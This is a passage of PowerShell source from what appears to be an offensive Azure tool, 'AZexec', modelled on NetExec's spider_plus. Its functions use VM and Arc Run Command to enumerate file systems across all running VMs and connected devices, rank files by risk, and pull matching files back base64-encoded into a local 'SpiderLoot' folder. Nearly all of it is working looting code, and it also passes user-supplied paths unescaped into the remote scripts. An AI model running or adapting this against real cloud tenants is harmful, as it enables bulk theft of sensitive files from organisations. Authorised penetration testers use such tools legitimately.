Get-ChildItem -Path '$StartPath' -Recurse -Force -Depth $MaxDepth -File$excludeFilter | ForEach-Object {
    [PSCustomObject]@{
        FullName = `$_.FullName
        Length = `$_.Length
        LastWriteTime = `$_.LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss')
        Extension = `$_.Extension
    }
} | ConvertTo-Csv -NoTypeInformation
"@

        try {
            $result = Invoke-AzVMRunCommand `
                -ResourceGroupName $ResourceGroup `
                -VMName $VMName `
                -CommandId "RunPowerShellScript" `
                -ScriptString $script `
                -ErrorAction Stop

            $output = $result.Value[0].Message
            $output = $output -replace "Enable succeeded:", ""
            $output = $output -replace "\[stdout\]", ""
            $output = $output -replace "\[stderr\]", ""
            $output = $output.Trim()

            # Parse CSV output
            if (-not [string]::IsNullOrWhiteSpace($output)) {
                $csvLines = $output -split "`n" | Where-Object { $_ -match ',' -and $_ -notmatch '^#' }
                if ($csvLines.Count -gt 1) {
                    # Skip header row
                    for ($i = 1; $i -lt $csvLines.Count; $i++) {
                        $line = $csvLines[$i].Trim()
                        if (-not [string]::IsNullOrWhiteSpace($line)) {
                            try {
                                $parts = $line | ConvertFrom-Csv -Header "FullName","Length","LastWriteTime","Extension"
                                if ($parts.FullName) {
                                    $files += [PSCustomObject]@{
                                        FullPath = $parts.FullName
                                        Name = [System.IO.Path]::GetFileName($parts.FullName)
                                        Length = [long]($parts.Length -replace '"', '')
                                        LastModified = $parts.LastWriteTime -replace '"', ''
                                        Extension = $parts.Extension -replace '"', ''
                                    }
                                }
                            } catch {
                                # Skip malformed lines
                            }
                        }
                    }
                }
            }
        } catch {
            Write-ColorOutput -Message "    [!] Error executing directory listing: $($_.Exception.Message)" -Color "Red"
        }

    } else {
        # Linux shell script
        $excludeFilter = ""
        if (-not [string]::IsNullOrWhiteSpace($ExcludePaths)) {
            $excludePaths = $ExcludePaths -split ',' | ForEach-Object { $_.Trim() }
            $excludeFilter = ($excludePaths | ForEach-Object { "-path '*/$_/*' -prune -o" }) -join ' '
        }

        $script = @"
find '$StartPath' -maxdepth $MaxDepth $excludeFilter -type f -printf '%p\t%s\t%TY-%Tm-%Td %TH:%TM:%TS\n' 2>/dev/null
"@

        try {
            $result = Invoke-AzVMRunCommand `
                -ResourceGroupName $ResourceGroup `
                -VMName $VMName `
                -CommandId "RunShellScript" `
                -ScriptString $script `
                -ErrorAction Stop

            $output = $result.Value[0].Message
            $output = $output -replace "Enable succeeded:", ""
            $output = $output -replace "\[stdout\]", ""
            $output = $output -replace "\[stderr\]", ""
            $output = $output.Trim()

            # Parse tab-separated output
            if (-not [string]::IsNullOrWhiteSpace($output)) {
                $lines = $output -split "`n"
                foreach ($line in $lines) {
                    $line = $line.Trim()
                    if (-not [string]::IsNullOrWhiteSpace($line)) {
                        $parts = $line -split "`t"
                        if ($parts.Count -ge 2) {
                            $files += [PSCustomObject]@{
                                FullPath = $parts[0]
                                Name = [System.IO.Path]::GetFileName($parts[0])
                                Length = [long]$parts[1]
                                LastModified = if ($parts.Count -ge 3) { $parts[2] } else { "" }
                                Extension = [System.IO.Path]::GetExtension($parts[0])
                            }
                        }
                    }
                }
            }
        } catch {
            Write-ColorOutput -Message "    [!] Error executing directory listing: $($_.Exception.Message)" -Color "Red"
        }
    }

    return $files
}

<#
.SYNOPSIS
    Download a file from a VM via remote execution.
.DESCRIPTION
    Downloads a file from a VM by base64 encoding it and transferring via command output.
    Only suitable for small files (< MaxFileSizeMB).
.PARAMETER VMName
    Name of the target VM.
.PARAMETER ResourceGroup
    Resource group containing the VM.
.PARAMETER OSType
    Operating system type (Windows or Linux).
.PARAMETER FilePath
    Path to the file on the VM.
.PARAMETER OutputFolder
    Local folder to save the file.
.PARAMETER MaxFileSizeMB
    Maximum file size in MB to download.
.PARAMETER FileSizeBytes
    Actual file size in bytes.
.OUTPUTS
    Boolean indicating success.
#>
function Save-SpiderVMFile {
    param(
        [Parameter(Mandatory = $true)]
        [string]$VMName,

        [Parameter(Mandatory = $true)]
        [string]$ResourceGroup,

        [Parameter(Mandatory = $true)]
        [string]$OSType,

        [Parameter(Mandatory = $true)]
        [string]$FilePath,

        [Parameter(Mandatory = $true)]
        [string]$OutputFolder,

        [Parameter(Mandatory = $false)]
        [int]$MaxFileSizeMB = 10,

        [Parameter(Mandatory = $false)]
        [long]$FileSizeBytes = 0
    )

    # Check file size
    if ($FileSizeBytes -gt ($MaxFileSizeMB * 1MB)) {
        return $false
    }

    try {
        # Build script to read and base64 encode file
        if ($OSType -eq "Windows") {
            $script = @"
`$bytes = [System.IO.File]::ReadAllBytes('$FilePath')
[Convert]::ToBase64String(`$bytes)
"@
            $commandId = "RunPowerShellScript"
        } else {
            $script = "base64 -w 0 '$FilePath'"
            $commandId = "RunShellScript"
        }

        $result = Invoke-AzVMRunCommand `
            -ResourceGroupName $ResourceGroup `
            -VMName $VMName `
            -CommandId $commandId `
            -ScriptString $script `
            -ErrorAction Stop

        $output = $result.Value[0].Message
        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        if (-not [string]::IsNullOrWhiteSpace($output)) {
            # Decode base64 content
            $bytes = [Convert]::FromBase64String($output)

            # Create local directory structure
            $relativePath = $FilePath -replace '^[A-Za-z]:', '' -replace '^/', '' -replace '/', [System.IO.Path]::DirectorySeparatorChar -replace '\\', [System.IO.Path]::DirectorySeparatorChar
            $destinationPath = Join-Path $OutputFolder $VMName
            $destinationPath = Join-Path $destinationPath $relativePath

            $destinationDir = [System.IO.Path]::GetDirectoryName($destinationPath)
            if (-not (Test-Path $destinationDir)) {
                New-Item -ItemType Directory -Path $destinationDir -Force | Out-Null
            }

            [System.IO.File]::WriteAllBytes($destinationPath, $bytes)
            return $true
        }

        return $false
    } catch {
        return $false
    }
}

<#
.SYNOPSIS
    Spider file systems on Azure VMs via exec.
.DESCRIPTION
    Enumerates files on Azure VMs using VM Run Command, applies pattern matching,
    classifies file risk, and optionally downloads matching files.
    This is the Azure equivalent of NetExec's spider_plus for VMs.
.PARAMETER VMName
    Target specific VM by name.
.PARAMETER AllVMs
    Spider all VMs in scope.
.PARAMETER ResourceGroup
    Optional resource group filter.
.PARAMETER SubscriptionId
    Optional subscription ID to target.
.PARAMETER Pattern
    Comma-separated file extension/keyword filter.
.PARAMETER StartPath
    Starting directory (default: C:\ on Windows, / on Linux).
.PARAMETER ExcludePaths
    Comma-separated paths to exclude.
.PARAMETER Depth
    Maximum recursion depth (default: 10).
.PARAMETER Download
    Enable file downloading.
.PARAMETER OutputFolder
    Download destination folder.
.PARAMETER MaxFileSize
    Maximum file size in MB to download.
.PARAMETER ExportPath
    Optional path to export results.
#>
function Invoke-VMSpiderEnumeration {
    param(
        [string]$VMName,
        [switch]$AllVMs,
        [string]$ResourceGroup,
        [string]$SubscriptionId,
        [string]$Pattern,
        [string]$StartPath,
        [string]$ExcludePaths,
        [int]$Depth = 10,
        [switch]$Download,
        [string]$OutputFolder = ".\SpiderLoot",
        [int]$MaxFileSize = 10,
        [string]$ExportPath
    )

    Write-ColorOutput -Message "`n[*] AZX - VM File System Spider" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: spider (Azure equivalent of nxc smb --spider for VMs)" -Color "Yellow"
    Write-ColorOutput -Message "[*] Spidering file systems on Azure VMs via exec`n" -Color "Cyan"

    # Display configuration
    if ($Pattern) {
        Write-ColorOutput -Message "[*] Pattern Filter: $Pattern" -Color "Cyan"
    } else {
        Write-ColorOutput -Message "[*] Pattern Filter: None (all files)" -Color "Cyan"
    }
    if ($StartPath) {
        Write-ColorOutput -Message "[*] Start Path: $StartPath" -Color "Cyan"
    } else {
        Write-ColorOutput -Message "[*] Start Path: Default (C:\ on Windows, / on Linux)" -Color "Cyan"
    }
    if ($ExcludePaths) {
        Write-ColorOutput -Message "[*] Exclude Paths: $ExcludePaths" -Color "Cyan"
    }
    if ($Download) {
        Write-ColorOutput -Message "[*] Download Mode: ENABLED" -Color "Yellow"
        Write-ColorOutput -Message "[*] Output Folder: $OutputFolder" -Color "Cyan"
        Write-ColorOutput -Message "[*] Max File Size: $MaxFileSize MB" -Color "Cyan"
    }
    Write-ColorOutput -Message "[*] Max Depth: $Depth" -Color "Cyan"
    Write-Host ""

    # Initialize required modules
    $requiredModules = @('Az.Accounts', 'Az.Compute', 'Az.Resources')
    if (-not (Initialize-AzureRMModules -RequiredModules $requiredModules)) {
        return
    }

    # Connect to Azure
    $azContext = Connect-AzureRM
    if (-not $azContext) { return }

    # Get subscriptions to enumerate
    $subscriptionsToScan = Get-SubscriptionsToEnumerate -SubscriptionId $SubscriptionId -CurrentContext $azContext
    if (-not $subscriptionsToScan) { return }

    # Create output folder if downloading
    if ($Download -and -not (Test-Path $OutputFolder)) {
        New-Item -ItemType Directory -Path $OutputFolder -Force | Out-Null
        Write-ColorOutput -Message "[+] Created output folder: $OutputFolder" -Color "Green"
    }

    # Global counters
    $exportData = @()
    $totalVMs = 0
    $totalFiles = 0
    $totalMatchedFiles = 0
    $totalDownloaded = 0
    $totalDownloadedSize = 0
    $criticalFiles = 0
    $highRiskFiles = 0
    $mediumRiskFiles = 0
    $skippedDueToSize = 0

    Write-ColorOutput -Message "[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] VM FILE SYSTEM SPIDER" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"

    # Loop through each subscription
    foreach ($subscription in $subscriptionsToScan) {
        if (-not (Set-SubscriptionContext -Subscription $subscription)) {
            continue
        }

        Write-ColorOutput -Message "[*] Retrieving Azure VMs..." -Color "Yellow"

        try {
            $vms = @()
            if ($ResourceGroup) {
                $vms = @(Get-AzVM -ResourceGroupName $ResourceGroup -Status -ErrorAction Stop)
            } else {
                $vms = @(Get-AzVM -Status -ErrorAction Stop)
            }

            # Filter by VM name if specified
            if ($VMName) {
                $vms = @($vms | Where-Object { $_.Name -eq $VMName })
            }

            # Filter to running VMs only
            $vms = @($vms | Where-Object { $_.PowerState -eq "VM running" })

            Write-ColorOutput -Message "[+] Found $($vms.Count) running VM(s)" -Color "Green"
        } catch {
            $errorMessage = $_.Exception.Message
            if ($errorMessage -like "*AuthorizationFailed*") {
                Write-ColorOutput -Message "[!] Authorization failed for subscription: $($subscription.Name)" -Color "Red"
            } else {
                Write-ColorOutput -Message "[!] Error retrieving VMs: $errorMessage" -Color "Red"
            }
            continue
        }

        if ($vms.Count -eq 0) {
            Write-ColorOutput -Message "[*] No running VMs found`n" -Color "Yellow"
            continue
        }

        $totalVMs += $vms.Count

        foreach ($vm in $vms) {
            $vmName = $vm.Name
            $vmRG = $vm.ResourceGroupName
            $osType = [string]$vm.StorageProfile.OsDisk.OsType

            Write-ColorOutput -Message "`n[*] VM: $vmName" -Color "White"
            Write-ColorOutput -Message "    Resource Group: $vmRG | OS: $osType" -Color "Gray"
            Write-ColorOutput -Message "    [*] Enumerating file system..." -Color "Yellow"

            # Get directory listing
            $files = Get-VMDirectoryListing -VMName $vmName -ResourceGroup $vmRG `
                -OSType $osType -StartPath $StartPath -ExcludePaths $ExcludePaths -MaxDepth $Depth

            Write-ColorOutput -Message "    [+] Found $($files.Count) files" -Color "Green"

            foreach ($file in $files) {
                $totalFiles++
                $fileName = $file.Name

                # Check pattern match
                $isMatch = Test-FilePatternMatch -FileName $fileName -Pattern $Pattern

                if ($isMatch) {
                    $totalMatchedFiles++
                    $riskLevel = Get-FileRiskLevel -FileName $fileName
                    $sizeFormatted = Format-FileSize -Bytes $file.Length

                    # Track risk levels
                    switch ($riskLevel) {
                        "CRITICAL" { $criticalFiles++ }
                        "HIGH" { $highRiskFiles++ }
                        "MEDIUM" { $mediumRiskFiles++ }
                    }

                    # Determine display color
                    $riskColor = switch ($riskLevel) {
                        "CRITICAL" { "Red" }
                        "HIGH" { "Yellow" }
                        "MEDIUM" { "Cyan" }
                        default { "Gray" }
                    }

                    $matchTag = if ($Pattern) { "[MATCH]" } else { "" }
                    $riskTag = if ($riskLevel -ne "LOW") { "[$riskLevel]" } else { "" }

                    # NetExec-style output
                    Write-Host "    AZR    " -NoNewline -ForegroundColor "Magenta"
                    Write-Host "$($vmName.PadRight(20)) " -NoNewline
                    Write-Host "VM     " -NoNewline
                    Write-Host "$($file.FullPath.Substring(0, [Math]::Min(50, $file.FullPath.Length)).PadRight(50)) " -NoNewline
                    if ($riskTag) {
                        Write-Host "$riskTag " -NoNewline -ForegroundColor $riskColor
                    }
                    if ($matchTag) {
                        Write-Host "$matchTag " -NoNewline -ForegroundColor "Green"
                    }
                    Write-Host "Size: $sizeFormatted" -ForegroundColor "Gray"

                    # Download if enabled
                    $downloaded = $false
                    if ($Download) {
                        if ($file.Length -le ($MaxFileSize * 1MB)) {
                            $downloaded = Save-SpiderVMFile -VMName $vmName -ResourceGroup $vmRG `
                                -OSType $osType -FilePath $file.FullPath `
                                -OutputFolder $OutputFolder -MaxFileSizeMB $MaxFileSize `
                                -FileSizeBytes $file.Length
                            if ($downloaded) {
                                $totalDownloaded++
                                $totalDownloadedSize += $file.Length
                            }
                        } else {
                            $skippedDueToSize++
                        }
                    }

                    # Add to export data
                    $exportData += [PSCustomObject]@{
                        Subscription = $subscription.Name
                        SubscriptionId = $subscription.Id
                        VMName = $vmName
                        ResourceGroup = $vmRG
                        OSType = $osType
                        Type = "VM"
                        FilePath = $file.FullPath
                        FileName = $fileName
                        SizeBytes = $file.Length
                        SizeFormatted = $sizeFormatted
                        RiskLevel = $riskLevel
                        LastModified = $file.LastModified
                        Downloaded = $downloaded
                        PatternMatched = $true
                    }
                }
            }
        }

        Write-ColorOutput -Message "`n[*] Subscription enumeration complete" -Color "Green"
    }

    # Spider Summary
    Write-ColorOutput -Message "`n[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] VM SPIDER SUMMARY" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"

    Write-ColorOutput -Message "[*] VMs Spidered: $totalVMs" -Color "White"
    Write-ColorOutput -Message "[*] Total Files Scanned: $totalFiles" -Color "White"
    Write-ColorOutput -Message "[*] Pattern Matches: $totalMatchedFiles" -Color $(if ($totalMatchedFiles -gt 0) { "Green" } else { "Gray" })

    Write-ColorOutput -Message "`n[*] RISK BREAKDOWN:" -Color "Yellow"
    Write-ColorOutput -Message "    Critical Files: $criticalFiles" -Color $(if ($criticalFiles -gt 0) { "Red" } else { "Green" })
    Write-ColorOutput -Message "    High Risk Files: $highRiskFiles" -Color $(if ($highRiskFiles -gt 0) { "Yellow" } else { "Green" })
    Write-ColorOutput -Message "    Medium Risk Files: $mediumRiskFiles" -Color $(if ($mediumRiskFiles -gt 0) { "Cyan" } else { "Green" })

    if ($Download) {
        $downloadedSizeFormatted = Format-FileSize -Bytes $totalDownloadedSize
        Write-ColorOutput -Message "`n[*] DOWNLOAD SUMMARY:" -Color "Yellow"
        Write-ColorOutput -Message "    Downloaded: $totalDownloaded files ($downloadedSizeFormatted)" -Color "Green"
        Write-ColorOutput -Message "    Skipped (size limit): $skippedDueToSize files" -Color "Gray"
        Write-ColorOutput -Message "    Output Folder: $OutputFolder" -Color "Cyan"
    }

    # Export if requested
    if ($ExportPath) {
        $stats = @{
            "Subscriptions Scanned" = $subscriptionsToScan.Count
            "VMs Spidered" = $totalVMs
            "Total Files" = $totalFiles
            "Pattern Matches" = $totalMatchedFiles
            "Critical Files (HIGH RISK)" = $criticalFiles
            "High Risk Files" = $highRiskFiles
            "Downloaded" = $totalDownloaded
        }
        Export-EnumerationResults -Data $exportData -ExportPath $ExportPath -Title "VM File System Spider" -Statistics $stats -CommandName "spider" -Description "Azure VM file system spider. Equivalent to NetExec spider_plus module for VMs."
    }

    # NetExec comparison
    Write-ColorOutput -Message "`n[*] NETEXEC COMPARISON:" -Color "Yellow"
    Write-ColorOutput -Message "    NetExec: nxc smb 192.168.1.0/24 -u user -p pass --spider" -Color "Gray"
    Write-ColorOutput -Message "    AZexec:  .\azx.ps1 spider -VMName vm-01" -Color "Gray"
    Write-ColorOutput -Message "`n    NetExec: nxc smb IP -M spider_plus -o DOWNLOAD_FLAG=True" -Color "Gray"
    Write-ColorOutput -Message "    AZexec:  .\azx.ps1 spider -VMName vm-01 -Download" -Color "Gray"

    return $exportData
}

# ============================================
# DEVICE SPIDER FUNCTIONS (Arc/MDE/Intune)
# ============================================

<#
.SYNOPSIS
    Get directory listing from a device via Arc Run Command.
.DESCRIPTION
    Executes a directory enumeration script on an Arc-enabled device and parses the output.
    Supports both Windows (Get-ChildItem) and Linux (find) devices.
.PARAMETER MachineName
    Name of the target Arc-enabled machine.
.PARAMETER ResourceGroup
    Resource group containing the machine.
.PARAMETER Location
    Azure region of the machine.
.PARAMETER OSType
    Operating system type (Windows or Linux).
.PARAMETER StartPath
    Starting directory path to enumerate.
.PARAMETER ExcludePaths
    Comma-separated list of paths to exclude.
.PARAMETER MaxDepth
    Maximum recursion depth.
.OUTPUTS
    Array of file objects with path, size, and date information.
#>
function Get-DeviceDirectoryListing {
    param(
        [Parameter(Mandatory = $true)]
        [string]$MachineName,

        [Parameter(Mandatory = $true)]
        [string]$ResourceGroup,

        [Parameter(Mandatory = $true)]
        [string]$Location,

        [Parameter(Mandatory = $true)]
        [string]$OSType,

        [Parameter(Mandatory = $false)]
        [string]$StartPath,

        [Parameter(Mandatory = $false)]
        [string]$ExcludePaths,

        [Parameter(Mandatory = $false)]
        [int]$MaxDepth = 10
    )

    $files = @()

    # Set default start path based on OS
    if ([string]::IsNullOrWhiteSpace($StartPath)) {
        $StartPath = if ($OSType -eq "Windows") { "C:\" } else { "/" }
    }

    # Generate unique run command name
    $runCommandName = "azx-spider-$(Get-Date -Format 'yyyyMMdd-HHmmss')"

    # Build the enumeration script
    if ($OSType -eq "Windows") {
        # Windows PowerShell script
        $excludeFilter = ""
        if (-not [string]::IsNullOrWhiteSpace($ExcludePaths)) {
            $excludePathsList = $ExcludePaths -split ',' | ForEach-Object { $_.Trim() }
            $excludeFilter = " | Where-Object { " + (($excludePathsList | ForEach-Object { "`$_.FullName -notlike '*$_*'" }) -join ' -and ') + " }"
        }

        $script = @"
`$ErrorActionPreference = 'SilentlyContinue'
Get-ChildItem -Path '$StartPath' -Recurse -Force -Depth $MaxDepth -File$excludeFilter | ForEach-Object {
    [PSCustomObject]@{
        FullName = `$_.FullName
        Length = `$_.Length
        LastWriteTime = `$_.LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss')
        Extension = `$_.Extension
    }
} | ConvertTo-Csv -NoTypeInformation
"@

        try {
            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $ResourceGroup `
                -MachineName $MachineName `
                -Location $Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop

            $output = $arcResult.InstanceViewOutput

            # Clean up the run command resource
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $ResourceGroup `
                -MachineName $MachineName `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue

            # Parse CSV output
            if (-not [string]::IsNullOrWhiteSpace($output)) {
                $csvLines = $output -split "`n" | Where-Object { $_ -match ',' -and $_ -notmatch '^#' }
                if ($csvLines.Count -gt 1) {
                    # Skip header row
                    for ($i = 1; $i -lt $csvLines.Count; $i++) {
                        $line = $csvLines[$i].Trim()
                        if (-not [string]::IsNullOrWhiteSpace($line)) {
                            try {
                                $parts = $line | ConvertFrom-Csv -Header "FullName","Length","LastWriteTime","Extension"
                                if ($parts.FullName) {
                                    $files += [PSCustomObject]@{
                                        FullPath = $parts.FullName
                                        Name = [System.IO.Path]::GetFileName($parts.FullName)
                                        Length = [long]($parts.Length -replace '"', '')
                                        LastModified = $parts.LastWriteTime -replace '"', ''
                                        Extension = $parts.Extension -replace '"', ''
                                    }
                                }
                            } catch {
                                # Skip malformed lines
                            }
                        }
                    }
                }
            }
        } catch {
            Write-ColorOutput -Message "    [!] Error executing directory listing: $($_.Exception.Message)" -Color "Red"
        }

    } else {
        # Linux shell script
        $excludeFilter = ""
        if (-not [string]::IsNullOrWhiteSpace($ExcludePaths)) {
            $excludePathsList = $ExcludePaths -split ',' | ForEach-Object { $_.Trim() }
            $excludeFilter = ($excludePathsList | ForEach-Object { "-path '*/$_/*' -prune -o" }) -join ' '
        }

        $script = @"
find '$StartPath' -maxdepth $MaxDepth $excludeFilter -type f -printf '%p\t%s\t%TY-%Tm-%Td %TH:%TM:%TS\n' 2>/dev/null
"@

        try {
            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $ResourceGroup `
                -MachineName $MachineName `
                -Location $Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop

            $output = $arcResult.InstanceViewOutput

            # Clean up the run command resource
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $ResourceGroup `
                -MachineName $MachineName `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue

            # Parse tab-separated output
            if (-not [string]::IsNullOrWhiteSpace($output)) {
                $lines = $output -split "`n"
                foreach ($line in $lines) {
                    $line = $line.Trim()
                    if (-not [string]::IsNullOrWhiteSpace($line)) {
                        $parts = $line -split "`t"
                        if ($parts.Count -ge 2) {
                            $files += [PSCustomObject]@{
                                FullPath = $parts[0]
                                Name = [System.IO.Path]::GetFileName($parts[0])
                                Length = [long]$parts[1]
                                LastModified = if ($parts.Count -ge 3) { $parts[2] } else { "" }
                                Extension = [System.IO.Path]::GetExtension($parts[0])
                            }
                        }
                    }
                }
            }
        } catch {
            Write-ColorOutput -Message "    [!] Error executing directory listing: $($_.Exception.Message)" -Color "Red"
        }
    }

    return $files
}

<#
.SYNOPSIS
    Download a file from an Arc-enabled device via remote execution.
.DESCRIPTION
    Downloads a file from a device by base64 encoding it and transferring via command output.
    Only suitable for small files (< MaxFileSizeMB).
.PARAMETER MachineName
    Name of the target Arc-enabled machine.
.PARAMETER ResourceGroup
    Resource group containing the machine.
.PARAMETER Location
    Azure region of the machine.
.PARAMETER OSType
    Operating system type (Windows or Linux).
.PARAMETER FilePath
    Path to the file on the device.
.PARAMETER OutputFolder
    Local folder to save the file.
.PARAMETER MaxFileSizeMB
    Maximum file size in MB to download.
.PARAMETER FileSizeBytes
    Actual file size in bytes.
.OUTPUTS
    Boolean indicating success.
#>
function Save-SpiderDeviceFile {
    param(
        [Parameter(Mandatory = $true)]
        [string]$MachineName,

        [Parameter(Mandatory = $true)]
        [string]$ResourceGroup,

        [Parameter(Mandatory = $true)]
        [string]$Location,

        [Parameter(Mandatory = $true)]
        [string]$OSType,

        [Parameter(Mandatory = $true)]
        [string]$FilePath,

        [Parameter(Mandatory = $true)]
        [string]$OutputFolder,

        [Parameter(Mandatory = $false)]
        [int]$MaxFileSizeMB = 10,

        [Parameter(Mandatory = $false)]
        [long]$FileSizeBytes = 0
    )

    # Check file size
    if ($FileSizeBytes -gt ($MaxFileSizeMB * 1MB)) {
        return $false
    }

    # Generate unique run command name
    $runCommandName = "azx-download-$(Get-Date -Format 'yyyyMMdd-HHmmss')"

    try {
        # Build script to read and base64 encode file
        if ($OSType -eq "Windows") {
            $script = @"
`$bytes = [System.IO.File]::ReadAllBytes('$FilePath')
[Convert]::ToBase64String(`$bytes)
"@
        } else {
            $script = "base64 -w 0 '$FilePath'"
        }

        $arcResult = Invoke-AzConnectedMachineRunCommand `
            -ResourceGroupName $ResourceGroup `
            -MachineName $MachineName `
            -Location $Location `
            -RunCommandName $runCommandName `
            -SourceScript $script `
            -ErrorAction Stop

        $output = $arcResult.InstanceViewOutput

        # Clean up the run command resource
        Remove-AzConnectedMachineRunCommand `
            -ResourceGroupName $ResourceGroup `
            -MachineName $MachineName `
            -RunCommandName $runCommandName `
            -ErrorAction SilentlyContinue

        if (-not [string]::IsNullOrWhiteSpace($output)) {
            # Decode base64 content
            $output = $output.Trim()
            $bytes = [Convert]::FromBase64String($output)

            # Create local directory structure
            $relativePath = $FilePath -replace '^[A-Za-z]:', '' -replace '^/', '' -replace '/', [System.IO.Path]::DirectorySeparatorChar -replace '\\', [System.IO.Path]::DirectorySeparatorChar
            $destinationPath = Join-Path $OutputFolder $MachineName
            $destinationPath = Join-Path $destinationPath $relativePath

            $destinationDir = [System.IO.Path]::GetDirectoryName($destinationPath)
            if (-not (Test-Path $destinationDir)) {
                New-Item -ItemType Directory -Path $destinationDir -Force | Out-Null
            }

            [System.IO.File]::WriteAllBytes($destinationPath, $bytes)
            return $true
        }

        return $false
    } catch {
        return $false
    }
}

<#
.SYNOPSIS
    Spider file systems on Arc/MDE/Intune devices via exec.
.DESCRIPTION
    Enumerates files on connected devices using the appropriate execution method,
    applies pattern matching, classifies file risk, and optionally downloads matching files.
    This is the Azure equivalent of NetExec's spider_plus for Arc-enabled servers.
.PARAMETER DeviceName
    Target specific device by name.
.PARAMETER AllDevices
    Spider all devices in scope.
.PARAMETER ResourceGroup
    Optional resource group filter.
.PARAMETER SubscriptionId
    Optional subscription ID to target.
.PARAMETER ExecMethod
    Execution method: auto, arc, mde, intune.
.PARAMETER Pattern
    Comma-separated file extension/keyword filter.
.PARAMETER StartPath
    Starting directory (default: C:\ on Windows, / on Linux).
.PARAMETER ExcludePaths
    Comma-separated paths to exclude.
.PARAMETER Depth
    Maximum recursion depth (default: 10).
.PARAMETER Download
    Enable file downloading.
.PARAMETER OutputFolder
    Download destination folder.
.PARAMETER MaxFileSize
    Maximum file size in MB to download.
.PARAMETER ExportPath
    Optional path to export results.
#>
function Invoke-DeviceSpiderEnumeration {
    param(
        [string]$DeviceName,
        [switch]$AllDevices,
        [string]$ResourceGroup,
        [string]$SubscriptionId,
        [string]$ExecMethod = "auto",
        [string]$Pattern,
        [string]$StartPath,
        [string]$ExcludePaths,
        [int]$Depth = 10,
        [switch]$Download,
        [string]$OutputFolder = ".\SpiderLoot",
        [int]$MaxFileSize = 10,
        [string]$ExportPath
    )

    Write-ColorOutput -Message "`n[*] AZX - Device File System Spider" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: spider (Azure equivalent of nxc smb --spider for Arc/MDE/Intune devices)" -Color "Yellow"
    Write-ColorOutput -Message "[*] Spidering file systems on connected devices via exec`n" -Color "Cyan"

    # Display configuration
    if ($Pattern) {
        Write-ColorOutput -Message "[*] Pattern Filter: $Pattern" -Color "Cyan"
    } else {
        Write-ColorOutput -Message "[*] Pattern Filter: None (all files)" -Color "Cyan"
    }
    if ($StartPath) {
        Write-ColorOutput -Message "[*] Start Path: $StartPath" -Color "Cyan"
    } else {
        Write-ColorOutput -Message "[*] Start Path: Default (C:\ on Windows, / on Linux)" -Color "Cyan"
    }
    if ($ExcludePaths) {
        Write-ColorOutput -Message "[*] Exclude Paths: $ExcludePaths" -Color "Cyan"
    }
    Write-ColorOutput -Message "[*] Execution Method: $ExecMethod" -Color "Cyan"
    if ($Download) {
        Write-ColorOutput -Message "[*] Download Mode: ENABLED" -Color "Yellow"
        Write-ColorOutput -Message "[*] Output Folder: $OutputFolder" -Color "Cyan"
        Write-ColorOutput -Message "[*] Max File Size: $MaxFileSize MB" -Color "Cyan"
    }
    Write-ColorOutput -Message "[*] Max Depth: $Depth" -Color "Cyan"
    Write-Host ""

    # Initialize required modules
    $requiredModules = @('Az.Accounts', 'Az.Resources', 'Az.ConnectedMachine')
    if (-not (Initialize-AzureRMModules -RequiredModules $requiredModules)) {
        return
    }

    # Connect to Azure
    $azContext = Connect-AzureRM
    if (-not $azContext) { return }

    # Get subscriptions to enumerate
    $subscriptionsToScan = Get-SubscriptionsToEnumerate -SubscriptionId $SubscriptionId -CurrentContext $azContext
    if (-not $subscriptionsToScan) { return }

    # Create output folder if downloading
    if ($Download -and -not (Test-Path $OutputFolder)) {
        New-Item -ItemType Directory -Path $OutputFolder -Force | Out-Null
        Write-ColorOutput -Message "[+] Created output folder: $OutputFolder" -Color "Green"
    }

    # Global counters
    $exportData = @()
    $totalDevices = 0
    $totalFiles = 0
    $totalMatchedFiles = 0
    $totalDownloaded = 0
    $totalDownloadedSize = 0
    $criticalFiles = 0
    $highRiskFiles = 0
    $mediumRiskFiles = 0
    $skippedDueToSize = 0

    Write-ColorOutput -Message "[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] DEVICE FILE SYSTEM SPIDER" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"

    # Loop through each subscription
    foreach ($subscription in $subscriptionsToScan) {
        if (-not (Set-SubscriptionContext -Subscription $subscription)) {
            continue
        }

        Write-ColorOutput -Message "[*] Retrieving Arc-enabled devices..." -Color "Yellow"

        try {
            # Check if Az.ConnectedMachine module is available
            if (-not (Get-Module -ListAvailable -Name Az.ConnectedMachine)) {
                Write-ColorOutput -Message "[!] Az.ConnectedMachine module not available" -Color "Red"
                Write-ColorOutput -Message "[*] Install with: Install-Module Az.ConnectedMachine" -Color "Yellow"
                continue
            }

            Import-Module Az.ConnectedMachine -ErrorAction SilentlyContinue

            $devices = @()
            if ($ResourceGroup) {
                $devices = @(Get-AzConnectedMachine -ResourceGroupName $ResourceGroup -ErrorAction Stop)
            } else {
                $devices = @(Get-AzConnectedMachine -ErrorAction Stop)
            }

            # Filter by device name if specified
            if ($DeviceName) {
                $devices = @($devices | Where-Object { $_.Name -eq $DeviceName })
            }

            # Filter to connected devices only
            $devices = @($devices | Where-Object { $_.Status -eq "Connected" })

            Write-ColorOutput -Message "[+] Found $($devices.Count) connected device(s)" -Color "Green"
        } catch {
            $errorMessage = $_.Exception.Message
            if ($errorMessage -like "*AuthorizationFailed*") {
                Write-ColorOutput -Message "[!] Authorization failed for subscription: $($subscription.Name)" -Color "Red"
            } else {
